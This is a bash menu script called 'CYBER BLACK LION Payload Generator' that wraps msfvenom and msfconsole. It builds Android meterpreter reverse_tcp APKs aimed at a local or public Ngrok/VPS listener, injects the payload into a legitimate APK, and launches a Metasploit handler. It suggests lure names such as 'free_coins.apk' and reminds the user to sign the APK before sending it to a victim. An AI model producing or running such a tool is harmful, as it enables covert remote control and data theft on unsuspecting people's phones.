#!/bin/bash

# Colors for the fancy menu
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Fancy Header Function
show_menu() {
    clear

    echo -e "${BLUE}"
    echo -e "  ███╗   ███╗███████╗███████╗"
    echo -e "  ████╗ ████║██╔════╝██╔════╝"
    echo -e "  ██╔████╔██║███████╗█████╗  "
    echo -e "  ██║╚██╔╝██║╚════██║██╔══╝  "
    echo -e "  ██║ ╚═╝ ██║███████║██║     "
    echo -e "  ╚═╝     ╚═╝╚══════╝╚═╝     "
    echo -e "${RED}"
    echo -e "  ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗      ██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ "
    echo -e "  ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗    ██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗"
    echo -e "  ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║    ██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝"
    echo -e "  ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║    ██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗"
    echo -e "  ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝    ╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║"
    echo -e "  ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝"
    echo -e "${BLUE}          --- CYBER BLACK LION Payload Generator ---${NC}"
    echo -e "${YELLOW}-------------------------------------------------------------------${NC}"
    echo -e "${GREEN} [1] Create Localhost Android Payload (APK)"
    echo -e "${GREEN} [2] Create Public Payload (Ngrok/VPS)"
    echo -e "${GREEN} [3] Bind Payload with another APK (Advanced)"
    echo -e "${GREEN} [4] Start Metasploit Handler (Listening)"
    echo -e "${RED}    [5] Exit"
    echo -e "${YELLOW}-------------------------------------------------------------------${NC}"
}

# 1. Localhost Payload
create_local() {
    echo -e "${BLUE}[*] Setting up Localhost Payload...${NC}"
    read -p "Enter your Local IP (LHOST): " lhost
    read -p "Enter Port (LPORT): " lport
    read -p "Enter Output Name (e.g., update.apk): " output
    
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $output
    echo -e "${GREEN}[+] Payload created successfully as $output!${NC}"
    read -p "Press enter to go back..."
}

# 2. Public Payload
create_public() {
    echo -e "${BLUE}[*] Setting up Public Payload...${NC}"
    echo -e "${YELLOW}Tip: Use Ngrok or a VPS IP here.${NC}"
    read -p "Enter Public IP/Domain (LHOST): " lhost
    read -p "Enter Port (LPORT): " lport
    read -p "Enter Output Name (e.g., free_coins.apk): " output
    
    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $output
    echo -e "${GREEN}[+] Public Payload created as $output!${NC}"
    read -p "Press enter to go back..."
}

# 3. Bind/Inject APK (Concept)
bind_apk() {
    echo -e "${BLUE}[*] APK Binding Mode...${NC}"
    echo -e "${YELLOW}Warning: This requires 'msfvenom' and 'apktool'.${NC}"
    read -p "Enter Original APK path: " original_apk
    read -p "Enter your LHOST: " lhost
    read -p "Enter your LPORT: " lport
    read -p "Enter Final APK name: " final_apk
    
    echo -e "${BLUE}[*] Injecting payload into $original_apk...${NC}"
    # Basic msfvenom injection command
    msfvenom -x $original_apk -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $final_apk
    echo -e "${GREEN}[+] Binded APK created as $final_apk!${NC}"
    echo -e "${YELLOW}Note: You must sign this APK using 'apksigner' before sending it to victim!${NC}"
    read -p "Press enter to go back..."
}

# 4. Start Handler
start_handler() {
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    echo -e "${BLUE}[*] Launching Metasploit Handler...${NC}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit"
}

# Main Loop
while true; do
    show_menu
    read -p "Choose an option: " choice
    case $choice in
        1) create_local ;;
        2) create_public ;;
        3) bind_apk ;;
        4) start_handler ;;
        5) echo -e "${RED}Goodbye Hacker! 💀${NC}"; exit 0 ;;
        *) echo -e "${RED}Invalid option, try again!${NC}"; sleep 2 ;;
    esac
done
                                                                                                                                                                                             
